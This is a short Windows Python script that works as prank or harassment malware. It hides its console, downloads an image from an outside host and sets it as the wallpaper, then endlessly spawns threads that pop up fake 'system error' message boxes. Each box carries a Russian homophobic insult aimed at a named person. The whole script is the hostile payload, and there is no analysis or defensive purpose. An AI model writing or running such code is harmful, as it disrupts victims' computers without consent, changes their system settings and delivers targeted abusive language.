import ctypes
import threading
import time
import os
import urllib.request

hwnd = ctypes.windll.kernel32.GetConsoleWindow()
if hwnd:
    ctypes.windll.user32.ShowWindow(hwnd, 0)

word = 'сипестат пидор'

img_path = os.path.join(os.environ['TEMP'], 'img.jpg')
urllib.request.urlretrieve('https://i.ibb.co/TMWd9kH5/photo-2024-03-24-02-44-49.jpg', img_path)
ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)

def show():
    ctypes.windll.user32.MessageBoxW(0, word, 'ОШИБКА СИСТЕМЫ', 0x10)

while 1:
    threading.Thread(target=show).start()
    time.sleep(0.1)
